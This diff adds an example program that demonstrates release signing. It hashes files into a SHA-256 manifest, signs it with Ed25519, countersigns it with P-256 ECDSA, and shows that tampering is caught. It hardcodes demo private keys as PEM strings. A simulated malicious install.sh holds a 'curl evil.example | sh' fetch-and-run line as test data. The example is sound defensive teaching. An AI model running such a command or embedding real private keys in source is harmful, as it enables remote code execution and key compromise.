@@ -1,0 +1,186 @@
+// Release signing
+//
+// Shows: how a project signs what it publishes, with keys in the files
+// every tool writes. The release key is an Ed25519 private key in PKCS #8
+// PEM, as `openssl genpkey` made it; its public key, exported as a PEM
+// SubjectPublicKeyInfo, is what users pin. The publisher writes a
+// manifest of SHA-256 digests and signs it; a user who downloaded the
+// files checks the signature with the pinned key and then every digest.
+// A backup key, a P-256 key in the older SEC 1 form `openssl ecparam`
+// writes, is converted to PKCS #8 byte for byte as `openssl pkcs8 -topk8`
+// does, and countersigns with ECDSA. Both signatures are deterministic, so
+// signing again gives the same bytes; tampering anywhere is caught.
+
+import std;
+
+const str RELEASE_KEY =
+    "-----BEGIN PRIVATE KEY-----\n"
+    "MC4CAQAwBQYDK2VwBCIEIFpplPffkADBOVt+ybkbDDTILCGqyjQetl6KFx3E7BqP\n"
+    "-----END PRIVATE KEY-----\n";
+
+const str BACKUP_KEY_SEC1 =
+    "-----BEGIN EC PRIVATE KEY-----\n"
+    "MHcCAQEEIKWLQQd9YmSPGr+uqlCMez6DnSd0NMmNe7CFDl9FS60PoAoGCCqGSM49\n"
+    "AwEHoUQDQgAEEwkNBJPL11p1HOPzWZhR32YTC397GsXsVx380xluHuB4vDQ8AAsv\n"
+    "N2eUdnpgppdmW4J6gYk2c4Mp/2wwOSkoJQ==\n"
+    "-----END EC PRIVATE KEY-----\n";
+
+// What `openssl pkcs8 -topk8 -nocrypt` writes for the backup key.
+const str BACKUP_KEY_OPENSSL_PKCS8 =
+    "-----BEGIN PRIVATE KEY-----\n"
+    "MIGHAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBG0wawIBAQQgpYtBB31iZI8av66q\n"
+    "UIx7PoOdJ3Q0yY17sIUOX0VLrQ+hRANCAAQTCQ0Ek8vXWnUc4/NZmFHfZhMLf3sa\n"
+    "xexXHfzTGW4e4Hi8NDwACy83Z5R2emCml2ZbgnqBiTZzgyn/bDA5KSgl\n"
+    "-----END PRIVATE KEY-----\n";
+
+// A published file: its name and its bytes.
+struct Artifact
+{
+    String name;
+    String body;
+}
+
+fn artifact(str name, str body) : Artifact
+{
+    Artifact { .name = String::from_str(name), .body = String::from_str(body) }
+}
+
+// "<sha256 hex>  <name>" per file, as `sha256sum` prints them.
+fn manifest(ref<Vec<Artifact>, shared> files) : String
+{
+    String out = String::new();
+    foreach (f in files)
+    {
+        String::append(
+            &mut out,
+            String::as_view(&to_hex(&sha256(StringView::as_bytes(String::as_view(&f.body)))[0..$])),
+        );
+        String::append(&mut out, "  ");
+        String::append(&mut out, String::as_view(&f.name));
+        String::append(&mut out, "\n");
+    }
+    out
+}
+
+enum Check
+{
+    Good,
+    BadSignature,
+    BadFile(String),
+    Missing(String),
+}
+
+// What a user does: the manifest's signature under the pinned key, then
+// each downloaded file against its line.
+fn check(
+    StringView pinned_pem,
+    ref<SignatureScheme, shared> scheme,
+    StringView text,
+    slice<u8, shared> sig,
+    ref<Vec<Artifact>, shared> downloaded,
+) : Check
+{
+    CertKey key = Result::unwrap(CertKey::from_pem(pinned_pem));
+    if (!verify_signature(&key, scheme, StringView::as_bytes(text), sig))
+    {
+        return BadSignature;
+    }
+    Vec<StringView> lines = StringView::split(StringView::trim_end(text), "\n");
+    foreach (line in &lines)
+    {
+        StringView digest = StringView::sub(*line, 0, 64);
+        StringView name = StringView::sub(*line, 66, StringView::len(*line));
+        bool found = false;
+        foreach (f in downloaded)
+        {
+            if (f.name == name)
+            {
+                found = true;
+                if (!StringView::eq(
+                    String::as_view(&to_hex(&sha256(StringView::as_bytes(String::as_view(&f.body)))[0..$])),
+                    digest,
+                ))
+                {
+                    return BadFile(String::from_view(name));
+                }
+            }
+        }
+        if (!found)
+        {
+            return Missing(String::from_view(name));
+        }
+    }
+    Good
+}
+
+fn say(str label, Check c)
+{
+    match (c)
+    {
+        Good         : printf("%-28s ok\n", label),
+        BadSignature : printf("%-28s REFUSED: manifest signature does not verify\n", label),
+        BadFile(n)   : printf("%-28s REFUSED: %s does not match the manifest\n", label, &n),
+        Missing(n)   : printf("%-28s REFUSED: %s is missing\n", label, &n),
+    }
+}
+
+fn main() : u8
+{
+    Vec<Artifact> files = Vec::new();
+    Vec::push(&mut files, artifact("cobaltc-1.4.0.tar", "pretend this is a tarball of the compiler\n"));
+    Vec::push(&mut files, artifact("install.sh", "#!/bin/sh\ncp cobc /usr/local/bin\n"));
+    Vec::push(&mut files, artifact("README", "CobaltC 1.4.0\n"));
+
+    // The publisher.
+    PrivateKey release = Result::unwrap(PrivateKey::from_pem(RELEASE_KEY));
+    String pinned = Option::unwrap(CertKey::to_pem(&PrivateKey::public_key(&release)));
+    printf("release public key, to pin:\n%s\n", &pinned);
+    String text = manifest(&files);
+    printf("MANIFEST:\n%s\n", &text);
+    Vec<u8> sig = Option::unwrap(sign(&release, &Ed25519, StringView::as_bytes(String::as_view(&text))));
+    Vec<u8> again = Option::unwrap(sign(&release, &Ed25519, StringView::as_bytes(String::as_view(&text))));
+    printf("MANIFEST.sig (Ed25519, base64): %s\n", &base64_encode(&sig[0..$]));
+    printf("signing again gives the same bytes: %v\n\n", digest_eq(&sig[0..$], &again[0..$]));
+
+    // The users.
+    say("as published", check(String::as_view(&pinned), &Ed25519, String::as_view(&text), &sig[0..$], &files));
+    Vec<Artifact> evil = Vec::new();
+    Vec::push(&mut evil, artifact("cobaltc-1.4.0.tar", "pretend this is a tarball of the compiler\n"));
+    Vec::push(&mut evil, artifact("install.sh", "#!/bin/sh\ncurl evil.example | sh\n"));
+    Vec::push(&mut evil, artifact("README", "CobaltC 1.4.0\n"));
+    say("install.sh replaced", check(String::as_view(&pinned), &Ed25519, String::as_view(&text), &sig[0..$], &evil));
+    String edited = manifest(&evil);
+    say(
+        "manifest rewritten to match",
+        check(String::as_view(&pinned), &Ed25519, String::as_view(&edited), &sig[0..$], &evil),
+    );
+    Vec<Artifact> partial = Vec::new();
+    Vec::push(&mut partial, artifact("cobaltc-1.4.0.tar", "pretend this is a tarball of the compiler\n"));
+    Vec::push(&mut partial, artifact("install.sh", "#!/bin/sh\ncp cobc /usr/local/bin\n"));
+    say(
+        "README not downloaded",
+        check(String::as_view(&pinned), &Ed25519, String::as_view(&text), &sig[0..$], &partial),
+    );
+
+    // The backup key: SEC 1 in, PKCS #8 out, as openssl does it.
+    PrivateKey backup = Result::unwrap(PrivateKey::from_pem(BACKUP_KEY_SEC1));
+    String pkcs8 = PrivateKey::to_pem(&backup);
+    printf("\nbackup key as PKCS #8 matches openssl pkcs8 -topk8: %v\n", pkcs8 == BACKUP_KEY_OPENSSL_PKCS8);
+    String backup_pinned = Option::unwrap(CertKey::to_pem(&PrivateKey::public_key(&backup)));
+    SignatureScheme es = Ecdsa(Sha2_256);
+    Vec<u8> counter = Option::unwrap(sign(&backup, &es, StringView::as_bytes(String::as_view(&text))));
+    printf("MANIFEST.sig2 (ECDSA P-256, DER, %v bytes): %s\n", Vec::len(&counter), &to_hex(&counter[0..$]));
+    say(
+        "countersignature",
+        check(String::as_view(&backup_pinned), &es, String::as_view(&text), &counter[0..$], &files),
+    );
+    say(
+        "countersig under release key",
+        check(String::as_view(&pinned), &es, String::as_view(&text), &counter[0..$], &files),
+    );
+    say(
+        "release sig under backup key",
+        check(String::as_view(&backup_pinned), &Ed25519, String::as_view(&text), &sig[0..$], &files),
+    );
+    0
+}
